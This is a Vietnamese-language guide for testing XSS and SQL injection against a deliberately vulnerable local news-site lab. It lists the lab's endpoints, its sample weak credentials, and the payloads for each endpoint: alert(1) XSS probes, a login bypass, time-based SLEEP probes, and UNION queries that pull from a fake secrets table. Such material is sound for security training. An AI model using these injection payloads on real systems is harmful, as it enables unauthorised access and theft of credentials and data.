# Hướng Dẫn Kiểm Thử XSS Và SQLi Cho NewsHub Lab

Tài liệu này liệt kê các URL, endpoint, tham số và vị trí sink dùng để kiểm thử XSS/SQLi trong NewsHub Vulnerable Lab.

Base URL mặc định:

```text
http://127.0.0.1:8080
```

Chỉ dùng trong môi trường lab local. Không dùng các payload này trên hệ thống không được phép kiểm thử.

## Mục Lục Nhanh

Classic PHP app:

```text
/index.php
/search.php
/news.php?id=1
/category.php?id=1
/user/login.php
/user/register.php
/user/profile.php
/admin/dashboard.php
/admin/users.php
/admin/news_manage.php
```

SPA app:

```text
/spa/search
/spa/article/1
/spa/comments/1
/spa/logs
```

Classic API:

```text
/api/suggest.php?q=...
/api/track.php?page=...&id=...&ref=...
```

SPA JSON API:

```text
/api/spa/search.php?q=...
/api/spa/news.php?id=...
/api/spa/comments.php?news_id=...
/api/spa/comment_add.php
/api/spa/logs.php?keyword=...
```

Tài khoản mẫu:

```text
admin / admin123
editor1 / editor123
thinhnv / password123
minhlt / password
huongnt / 12345678
```

## Payload XSS Mẫu

Payload cơ bản:

```html
<img src=x onerror=alert(1)>
```

Payload script tag:

```html
<script>alert(1)</script>
```

Payload thoát khỏi attribute HTML:

```html
"><img src=x onerror=alert(1)>
```

Payload URL-encoded:

```text
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

## Reflected XSS

### 1. `/search.php?q=...`

Endpoint:

```text
GET /search.php?q=PAYLOAD
```

Tham số:

```text
q
```

Sink:

```text
HTML response của search page
input value
dòng thông báo kết quả tìm kiếm
```

Payload:

```text
/search.php?q=<img src=x onerror=alert(1)>
/search.php?q="><img src=x onerror=alert(1)>
```

Ghi chú:

```text
q cũng được lưu vào bảng search_logs, vì vậy payload này còn có thể thành Stored XSS ở admin dashboard và SPA logs.
```

### 2. `/search.php?author=...`

Endpoint:

```text
GET /search.php?author=PAYLOAD
```

Tham số:

```text
author
```

Sink:

```text
dòng thông báo kết quả tìm kiếm
```

Payload:

```text
/search.php?author=<img src=x onerror=alert(1)>
```

### 3. SPA search

Route:

```text
GET /spa/search?q=PAYLOAD
```

API được gọi:

```text
GET /api/spa/search.php?q=PAYLOAD
```

Sink:

```text
app.js render data.query bằng innerHTML
```

Payload:

```text
/spa/search?q=<img src=x onerror=alert(1)>
```

## Stored XSS

### 1. Stored XSS qua comment classic

Tạo comment:

```text
POST /comment/add.php
```

Body:

```text
news_id=1
author_name=guest
content=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /news.php?id=1
```

Field bị ảnh hưởng:

```text
comments.content
```

### 2. Stored XSS qua comment SPA

Route tạo comment:

```text
GET /spa/comments/1
```

API tạo comment:

```text
POST /api/spa/comment_add.php
```

Body:

```text
news_id=1
author_name=spa_guest
content=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /spa/comments/1
GET /api/spa/comments.php?news_id=1
```

Field bị ảnh hưởng:

```text
comments.content
comments.author_name
```

Ghi chú:

```text
SPA lấy JSON từ API rồi render comment bằng innerHTML.
```

### 3. Stored XSS qua user bio

Tạo user:

```text
POST /user/register.php
```

Body:

```text
username=xsstest
email=xsstest@example.local
password=password123
bio=<img src=x onerror=alert(1)>
```

Cập nhật profile:

```text
POST /user/profile.php
```

Body:

```text
action=update
email=xsstest@example.local
bio=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /user/profile.php?user=xsstest
GET /admin/users.php
```

Field bị ảnh hưởng:

```text
users.bio
```

### 4. Stored XSS qua search logs

Seed payload:

```text
GET /search.php?q=<img src=x onerror=alert(1)>
GET /api/spa/search.php?q=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /admin/dashboard.php
GET /spa/logs
GET /api/spa/logs.php
```

Field bị ảnh hưởng:

```text
search_logs.keyword
```

### 5. Stored XSS qua User-Agent trong SPA logs

Seed request:

```text
GET /api/spa/search.php?q=test
```

Header:

```text
User-Agent: <img src=x onerror=alert(1)>
```

Sink:

```text
GET /spa/logs
```

Field bị ảnh hưởng:

```text
search_logs.user_agent
```

Ghi chú:

```text
Cần dùng Burp, ZAP, curl hoặc DevTools để sửa header User-Agent.
```

### 6. Stored XSS qua bài viết trong admin

Endpoint:

```text
POST /admin/news_manage.php
```

Các field đáng kiểm thử:

```text
title
summary
content
tags
```

Sink:

```text
GET /news.php?id={id}
GET /spa/article/{id}
GET /spa/search?q=...
```

Ghi chú:

```text
Cần đăng nhập. SPA render nhiều field bài viết bằng innerHTML, nên dữ liệu từ API có thể trở thành DOM/Stored XSS.
```

## DOM-Based XSS

### 1. Classic search suggestions

Page:

```text
GET /search.php?q=PAYLOAD
```

API source:

```text
GET /api/suggest.php?q=...
```

Sink:

```text
search.php tạo HTML string rồi gán vào suggestions-container.innerHTML
```

Flow:

```text
1. Truy cập /search.php?q=PAYLOAD.
2. q được lưu raw vào search_logs.
3. JavaScript gọi /api/suggest.php?q=PAYLOAD.
4. API trả JSON suggestion.
5. JavaScript render suggestion bằng innerHTML.
```

Payload:

```text
/search.php?q=<img src=x onerror=alert(1)>
```

### 2. SPA search render

Route:

```text
GET /spa/search?q=PAYLOAD
```

API:

```text
GET /api/spa/search.php?q=PAYLOAD
```

Sink:

```text
app.js render data.query và result fields bằng innerHTML
```

Payload:

```text
/spa/search?q=<img src=x onerror=alert(1)>
```

### 3. SPA comments render

Route:

```text
GET /spa/comments/1
```

API:

```text
GET /api/spa/comments.php?news_id=1
```

Sink:

```text
app.js render comments.content và comments.author_name bằng innerHTML
```

Payload:

```text
Tạo comment có content = <img src=x onerror=alert(1)>
Mở lại /spa/comments/1
```

### 4. SPA logs render

Route:

```text
GET /spa/logs
```

API:

```text
GET /api/spa/logs.php?keyword=...
```

Sink:

```text
app.js render keyword và user_agent bằng innerHTML
```

Payload:

```text
/api/spa/search.php?q=<img src=x onerror=alert(1)>
/spa/logs
```

### 5. SPA article render

Route:

```text
GET /spa/article/1
```

API:

```text
GET /api/spa/news.php?id=1
```

Sink:

```text
app.js render article.title, article.content, article.cat_name, article.username bằng innerHTML
```

## Payload SQLi Mẫu

Probe cơ bản:

```text
'
"
' OR 1=1--%20
' AND 1=2--%20
1 OR 1=1
1 AND 1=2
1 AND SLEEP(5)
```

Error-based:

```text
' AND extractvalue(1,concat(0x7e,database()))--%20
```

Boolean-based:

```text
AND 1=1
AND 1=2
```

Time-based:

```text
AND SLEEP(5)
AND IF(1=1,SLEEP(5),0)
```

Bảng fake secret:

```text
secret_configs(config_key, config_value, description)
```

## SQLi - Classic PHP

### 1. Search SQLi error-based

Endpoint:

```text
GET /search.php?q=...
GET /search.php?author=...
```

Tham số:

```text
q
author
```

Payload:

```text
/search.php?q='
/search.php?q=' OR 1=1--%20
/search.php?q=' AND extractvalue(1,concat(0x7e,database()))--%20
/search.php?author=admin' OR '1'='1'--%20
```

Tín hiệu:

```text
Lỗi SQL được in ra HTML response.
```

### 2. Login SQLi authentication bypass

Endpoint:

```text
POST /user/login.php
```

Field:

```text
username
password
```

Payload:

```text
username=admin'--%20
password=anything
```

Hoặc:

```text
username=' OR '1'='1'--%20
password=anything
```

Tín hiệu:

```text
Đăng nhập thành công mà không cần đúng mật khẩu.
```

### 3. News SQLi UNION/error-based

Endpoint:

```text
GET /news.php?id=...
```

Tham số:

```text
id
```

Payload:

```text
/news.php?id='
/news.php?id=1 OR 1=1
/news.php?id=1 AND SLEEP(5)
```

UNION idea:

```text
/news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary',1,1,0,'published','tag',NOW(),NOW(),'user','email','cat' FROM secret_configs--%20
```

Tín hiệu:

```text
Lỗi SQL được hiển thị.
UNION output có thể xuất hiện trong vùng article.
```

### 4. Category SQLi boolean-based blind

Endpoint:

```text
GET /category.php?id=...
```

Tham số:

```text
id
```

Payload:

```text
/category.php?id=1 AND 1=1
/category.php?id=1 AND 1=2
/category.php?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='0'
/category.php?id=1 AND SLEEP(5)
```

Tín hiệu:

```text
Điều kiện đúng có dữ liệu.
Điều kiện sai trả rỗng hoặc báo không tồn tại.
```

### 5. Profile SQLi time-based

Endpoint:

```text
GET /user/profile.php?user=...
```

Tham số:

```text
user
```

Payload:

```text
/user/profile.php?user=admin' AND SLEEP(5)--%20
/user/profile.php?user=admin' AND IF(1=1,SLEEP(5),0)--%20
```

Tín hiệu:

```text
Lỗi SQL bị ẩn. Dùng độ trễ response để xác nhận.
```

### 6. Tracking API SQLi time-based

Endpoint:

```text
GET /api/track.php?page=...&id=...&ref=...
```

Tham số:

```text
id
ref
```

Payload:

```text
/api/track.php?page=news&id=1' AND SLEEP(5)--%20
/api/track.php?page=news&id=1&ref=http://x.local' AND IF(1=1,SLEEP(5),0)--%20
```

Tín hiệu:

```text
Endpoint trả ảnh GIF 1x1 và suppress lỗi. Dùng timing.
```

### 7. Suggest API SQLi

Endpoint:

```text
GET /api/suggest.php?q=...
```

Tham số:

```text
q
```

Payload:

```text
/api/suggest.php?q=' OR 1=1--%20
/api/suggest.php?q=' AND SLEEP(5)--%20
```

Tín hiệu:

```text
Endpoint trả JSON. Có thể kiểm thử blind/time-based.
```

## SQLi - Admin

Các endpoint admin cần session đăng nhập.

### 1. Admin dashboard UNION SQLi

Endpoint:

```text
GET /admin/dashboard.php?filter_cat=...
```

Tham số:

```text
filter_cat
```

Payload:

```text
/admin/dashboard.php?filter_cat=1'
/admin/dashboard.php?filter_cat=1 OR 1=1
```

UNION idea:

```text
/admin/dashboard.php?filter_cat=-1 UNION SELECT 1,config_key,'published',0,NOW(),'user',config_value FROM secret_configs--%20
```

Tín hiệu:

```text
Lỗi SQL hoặc dữ liệu UNION xuất hiện trong bảng quản lý bài viết.
```

### 2. Admin users boolean-based SQLi

Endpoint:

```text
GET /admin/users.php?search_user=...
```

Tham số:

```text
search_user
```

Payload:

```text
/admin/users.php?search_user=admin' AND 1=1--%20
/admin/users.php?search_user=admin' AND 1=2--%20
/admin/users.php?search_user=admin' AND (SELECT COUNT(*) FROM secret_configs)>0--%20
```

Tín hiệu:

```text
Lỗi bị suppress. So sánh số dòng kết quả.
```

### 3. Admin news edit SQLi

Endpoint:

```text
GET /admin/news_manage.php?edit_id=...
```

Tham số:

```text
edit_id
```

Payload:

```text
/admin/news_manage.php?edit_id=1'
/admin/news_manage.php?edit_id=1 OR 1=1
```

### 4. Admin news POST SQLi / Stored XSS

Endpoint:

```text
POST /admin/news_manage.php
```

Field đáng kiểm thử:

```text
tags
title
summary
content
```

Body mẫu:

```text
post_id=0
title=Test
summary=Test
content=<p>Test</p>
category_id=1
tags=<img src=x onerror=alert(1)>
status=published
```

## SQLi - SPA JSON API

Các endpoint này trả JSON và được SPA gọi bằng `fetch()`. Nên kiểm thử trực tiếp bằng Burp, ZAP, Postman, curl hoặc tab Network.

### 1. SPA search API

Endpoint:

```text
GET /api/spa/search.php?q=...&sort=...
```

Tham số:

```text
q
```

Payload:

```text
/api/spa/search.php?q='
/api/spa/search.php?q=' OR 1=1--%20
/api/spa/search.php?q=' AND extractvalue(1,concat(0x7e,database()))--%20
```

Tín hiệu:

```text
JSON trả về ok=false, db_error và sql.
q cũng được lưu vào search_logs.
```

SPA sink:

```text
/spa/search?q=PAYLOAD
```

### 2. SPA article API

Endpoint:

```text
GET /api/spa/news.php?id=...
```

Tham số:

```text
id
```

Payload:

```text
/api/spa/news.php?id='
/api/spa/news.php?id=1 OR 1=1
/api/spa/news.php?id=1 AND SLEEP(5)
```

UNION idea:

```text
/api/spa/news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary','tag',0,NOW(),'user','email','cat',1 FROM secret_configs--%20
```

Tín hiệu:

```text
Lỗi SQL trả về JSON.
SPA render article fields bằng innerHTML.
```

### 3. SPA comments API

Endpoint:

```text
GET /api/spa/comments.php?news_id=...
```

Tham số:

```text
news_id
```

Payload:

```text
/api/spa/comments.php?news_id=1 OR 1=1
/api/spa/comments.php?news_id=1 AND SLEEP(5)
```

Tín hiệu:

```text
JSON response thay đổi hoặc bị delay.
SPA render comments bằng innerHTML.
```

### 4. SPA comment create API

Endpoint:

```text
POST /api/spa/comment_add.php
```

Field:

```text
news_id
author_name
content
```

Body:

```text
news_id=1
author_name=spa_guest
content=<img src=x onerror=alert(1)>
```

Tín hiệu:

```text
Tạo Stored XSS.
Nếu SQL lỗi, API trả JSON có db_error và sql.
```

Sink:

```text
/spa/comments/1
/news.php?id=1
```

### 5. SPA logs API

Endpoint:

```text
GET /api/spa/logs.php?keyword=...
```

Tham số:

```text
keyword
```

Payload:

```text
/api/spa/logs.php?keyword='
/api/spa/logs.php?keyword=' OR 1=1--%20
/api/spa/logs.php?keyword=' AND SLEEP(5)--%20
```

Tín hiệu:

```text
JSON trả db_error nếu lỗi.
SPA render keyword và user_agent bằng innerHTML.
```

## Trang Tĩnh

Các trang tĩnh:

```text
/static/about.html
/static/contact.html
/static/faq.html
```

Hiện trạng:

```text
Không truy vấn database.
Không có backend xử lý form thật.
Phù hợp để test crawler/static content, không phải mục tiêu chính cho XSS/SQLi.
```

## Ma Trận Endpoint

| Loại | Method | Endpoint/Route | Param/Field | Sink/Tín hiệu |
|---|---:|---|---|---|
| Reflected XSS | GET | `/search.php` | `q`, `author` | HTML response |
| DOM XSS | GET | `/search.php` | `q` qua `/api/suggest.php` | `innerHTML` suggestions |
| Stored XSS | POST | `/comment/add.php` | `content` | `/news.php?id=...` |
| Stored XSS | POST | `/user/register.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
| Stored XSS | POST | `/user/profile.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
| Stored XSS | GET | `/search.php` | `q` | `/admin/dashboard.php`, `/spa/logs` |
| DOM/Stored XSS | GET | `/spa/search` | `q` | SPA `innerHTML` |
| DOM/Stored XSS | GET | `/spa/comments/{id}` | comment JSON | SPA `innerHTML` |
| DOM/Stored XSS | GET | `/spa/logs` | log JSON | SPA `innerHTML` |
| SQLi Error | GET | `/search.php` | `q`, `author` | DB error trong HTML |
| SQLi Auth Bypass | POST | `/user/login.php` | `username`, `password` | Login session |
| SQLi UNION/Error | GET | `/news.php` | `id` | Article output/error |
| SQLi Boolean | GET | `/category.php` | `id` | Có/không có kết quả |
| SQLi Time | GET | `/user/profile.php` | `user` | Response delay |
| SQLi Time | GET | `/api/track.php` | `id`, `ref` | Response delay |
| SQLi Blind | GET | `/api/suggest.php` | `q` | JSON/timing |
| SQLi UNION/Error | GET | `/admin/dashboard.php` | `filter_cat` | Table/error |
| SQLi Boolean | GET | `/admin/users.php` | `search_user` | Số dòng kết quả |
| SQLi | GET | `/admin/news_manage.php` | `edit_id` | Form/error |
| SQLi JSON | GET | `/api/spa/search.php` | `q` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/news.php` | `id` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/comments.php` | `news_id` | JSON `db_error` |
| SQLi JSON | POST | `/api/spa/comment_add.php` | `news_id`, `author_name`, `content` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/logs.php` | `keyword` | JSON `db_error` |

## Luồng Kiểm Thử Gợi Ý

1. Chạy lab:

```bash
docker compose up -d --build
# hoặc
docker-compose up -d --build
```

2. Mở classic app:

```text
http://127.0.0.1:8080/search.php?q=test
http://127.0.0.1:8080/news.php?id=1
```

3. Mở SPA:

```text
http://127.0.0.1:8080/spa/search
http://127.0.0.1:8080/spa/comments/1
http://127.0.0.1:8080/spa/logs
```

4. Bật Burp/ZAP hoặc DevTools Network để bắt API:

```text
/api/spa/search.php
/api/spa/news.php
/api/spa/comments.php
/api/spa/comment_add.php
/api/spa/logs.php
/api/suggest.php
/api/track.php
```

5. Test XSS trước bằng `alert(1)`.

6. Test SQLi theo thứ tự:

```text
quote probe
error-based
boolean-based
time-based
UNION-based
```

